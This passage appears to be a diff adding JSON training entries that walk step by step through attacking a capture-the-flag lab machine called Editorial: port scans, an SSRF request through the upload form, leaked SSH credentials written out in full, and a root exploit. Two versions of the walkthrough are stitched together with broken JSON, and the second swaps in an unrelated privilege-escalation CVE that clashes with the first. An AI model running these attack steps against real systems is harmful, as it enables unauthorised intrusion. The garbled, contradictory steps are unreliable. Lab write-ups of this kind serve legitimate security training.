+      "Look for signs of misconfigured services on the web server.",
+      "Add the relevant domain to the hosts file for future access."
+    ]
+  },
+  {
+    "section": "Web Application Testing",
+    "overview": "Explore the web application for vulnerabilities.",
+    "steps": [
+      {
+        "instruction": "Check the web application functionalities.",
+        "input": "Explore upload forms and search functionalities.",
+        "output": "Assessment of how forms transmit data (no data on submissions).\nPurpose: Understand input handling vulnerabilities."
+      },
+      {
+        "instruction": "Test for SSRF vulnerabilities.",
+        "input": "Use the upload feature to test URLs.",
+        "output": "Command: `curl -X POST http://editorial.htb/upload --data 'bookurl=http://127.0.0.1:5000'`\nPurpose: Confirm SSRF path to leak internal data."
+      }
+    ],
+    "considerations": [
+      "Note the server's behavior on erroneous requests.",
+      "Identify if the web application is built with Flask for tailored exploits."
+    ]
+  },
+  {
+    "section": "Exploiting SSRF",
+    "overview": "Leverage the SSRF vulnerability to access internal APIs.",
+    "steps": [
+      {
+        "instruction": "Identify internal services accessed via SSRF.",
+        "input": "Modify upload requests to hit localhost endpoints.",
+        "output": "Command: Use `ffuf` to target localhost endpoints on discovered ports.\nPurpose: Discover internal API endpoints responding to SSRF."
+      },
+      {
+        "instruction": "Extract sensitive data from the internal API.",
+        "input": "Identify valuable endpoints such as user information.",
+        "output": "Command: `curl http://editorial.htb/static/uploads/[uuid]` to access JSON data.\nPurpose: Obtain credentials or sensitive information."
+      }
+    ],
+    "considerations": [
+      "Watch for rate limiting or security controls around API requests.",
+      "Use endpoints that return useful user credentials."
+    ]
+  },
+  {
+    "section": "Gaining SSH Access",
+    "overview": "Utilize the credentials obtained to SSH into the machine.",
+    "steps": [
+      {
+        "instruction": "Log into SSH with obtained credentials.",
+        "input": "Use netexec for quick access assessment.",
+        "output": "Command: `netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'`\nPurpose: Verify valid SSH credentials."
+      },
+      {
+        "instruction": "Connect via SSH for shell access.",
+        "input": "Use `sshpass` to establish a shell.",
+        "output": "Command: `sshpass -p 'dev080217_devAPI!@' ssh dev@editorial.htb`\nPurpose: Confirm access to the user shell."
+      }
+    ],
+    "considerations": [
+      "Ensure to check user permissions for potential privilege escalation paths.",
+      "Look for any user-related configuration files that may contain additional credentials."
+    ]
+  },
+  {
+    "section": "Privilege Escalation",
+    "overview": "Identify methods to escalate privileges after gaining user access.",
+    "steps": [
+      {
+        "instruction": "Review available SUID binaries for exploitation.",
+        "input": "Assess the user's directory for vulnerable scripts.",
+        "output": "Command: `sudo -l` to check accessible commands.\nPurpose: Identify scripts that can be run as root."
+      },
+      {
+        "instruction": "Use GitPython CVE to exploit privilege.",
+        "input": "Execute the vulnerable Python script as root.",
+        "output": "Command: `sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::url'`\nPurpose: Trigger code execution via exploitation."
+      }
+    ],
+    "considerations": [
+      "Check for any existing security patching in the environment relating to vulnerabilities.",
+      "Document all findings for a comprehensive post-exploitation analysis."
+    ]
+  }
+{
+    "section": "Initial Reconnaissance",
+    "overview": "Identify open ports and services on the target.",
+    "steps": [
+      {
+        "instruction": "Perform a full port scan.",
+        "input": "Run Nmap to identify active services.",
+        "output": "Command: `nmap -p- --min-rate 10000 10.10.11.11`\nPurpose: Discovers open TCP ports on the target."
+      },
+      {
+        "instruction": "Scan for specific services and their versions.",
+        "input": "Refine the scan for critical ports.",
+        "output": "Command: `nmap -p 22,80 -sCV 10.10.11.11`\nPurpose: Provides detailed versions of services running on the open ports."
+      }
+    ],
+    "considerations": [
+      "Take note of the web server and its details.",
+      "Add the domain to the hosts file for future access."
+    ]
+  },
+  {
+    "section": "Web Application Testing",
+    "overview": "Explore the web application for vulnerabilities.",
+    "steps": [
+      {
+        "instruction": "Analyze the contact form and other functionalities.",
+        "input": "Check how data is sent and handled.",
+        "output": "Assessment of how forms transmit data (no data on submissions).\nPurpose: Identify inputs that could be exploited."
+      },
+      {
+        "instruction": "Test for SSRF vulnerabilities.",
+        "input": "Use the upload feature to test URLs pointing to localhost.",
+        "output": "Command: Send a POST request to the upload endpoint with SSRF payloads.\nPurpose: Confirm if internal services can be accessed."
+      }
+    ],
+    "considerations": [
+      "Observe the server's behavior for different request types.",
+      "Understand the web application's tech stack."
+    ]
+  },
+  {
+    "section": "Exploiting SSRF",
+    "overview": "Leverage the SSRF vulnerability to access internal APIs.",
+    "steps": [
+      {
+        "instruction": "Identify internal services accessible via SSRF.",
+        "input": "Use fuzzing against upload to discover internal API endpoints.",
+        "output": "Command: Use `ffuf` or similar tools to identify internal services.\nPurpose: Discover hidden APIs that may contain sensitive information."
+      },
+      {
+        "instruction": "Extract sensitive data from the internal API.",
+        "input": "Identify valuable endpoints that leak credentials.",
+        "output": "Command: `curl http://editorial.htb/static/uploads/[uuid]` to access API data.\nPurpose: Obtain usernames and passwords from the leaked data."
+      }
+    ],
+    "considerations": [
+      "Carefully note the vulnerabilities in the API responses.",
+      "Be aware of rate limiting and access controls."
+    ]
+  },
+  {
+    "section": "Gaining SSH Access",
+    "overview": "Utilize obtained credentials to SSH into the machine.",
+    "steps": [
+      {
+        "instruction": "Log into SSH with valid credentials.",
+        "input": "Use netexec for quick verification.",
+        "output": "Command: `netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'`\nPurpose: Verify that the credentials work for SSH access."
+      },
+      {
+        "instruction": "Connect via SSH for shell access.",
+        "input": "Use `sshpass` to automate the login process.",
+        "output": "Command: `sshpass -p 'dev080217_devAPI!@' ssh dev@editorial.htb`\nPurpose: Establish a user shell on the target system."
+      }
+    ],
+    "considerations": [
+      "Check for any additional user privileges and permissions.",
+      "Look for potential user-related files that may contain further credentials."
+    ]
+  },
+  {
+    "section": "Privilege Escalation",
+    "overview": "Identify methods to escalate privileges after gaining user access.",
+    "steps": [
+      {
+        "instruction": "Review available SUID binaries for exploitation.",
+        "input": "Assess the permissions of binaries related to Enlightenment.",
+        "output": "Command: `find / -perm -4000 2>/dev/null`\nPurpose: Identify SUID binaries that could be leveraged for privilege escalation."
+      },
+      {
+        "instruction": "Use CVE-2022-37706 for escalation.",
+        "input": "Invoke vulnerable binaries with crafted arguments.",
+        "output": "Command: `sudo /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount ...`\nPurpose: Execute a payload that leads to a root shell."
+      }
+    ],
+    "considerations": [
+      "Be mindful of the application environment and existing security measures.",
+      "Document any escalated privileges and their implications."
+    ]
+  }
+]
